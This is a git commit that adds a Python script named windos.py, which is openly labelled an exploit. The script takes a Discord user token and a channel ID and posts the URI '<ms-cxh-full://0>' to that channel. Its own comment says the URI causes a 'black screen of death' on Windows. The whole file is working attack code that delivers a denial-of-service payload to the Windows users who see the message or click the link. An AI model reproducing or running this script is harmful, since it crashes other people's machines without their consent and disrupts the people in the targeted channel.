1294e0c432493f18a97c8f8f7866e56a73ec0811
Vexvain <60254325+Vexvain@users.noreply.github.com>
2021-01-02 16:21:41 -0500

    Create windos.py

---
+++ Collection/windos.py
@@ -0,0 +1,34 @@
+# Sends a URI that causes a black screen of death on Windows
+# Made by: checksum 
+
+import requests
+import sys
+
+class Exploit:
+
+    def __init__(self, token, channel):
+        self.token = token
+        self.channel_id = channel
+        self.headers = {'Authorization': token}
+
+
+    def execute(self):
+        """ send malicious URI """
+        return requests.post(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages', headers=self.headers, json={'content': '<ms-cxh-full://0>'})
+
+    
+def main():
+    if len(sys.argv) < 3:
+        print(f'Usage: py {sys.argv[0]} <token> <channel id>')
+        sys.exit()
+
+    token = sys.argv[1]
+    channel_id = sys.argv[2]
+
+    exploit = Exploit(token, channel_id)
+
+    exploit.execute()
+
+
+if __name__ == '__main__':
+    main()
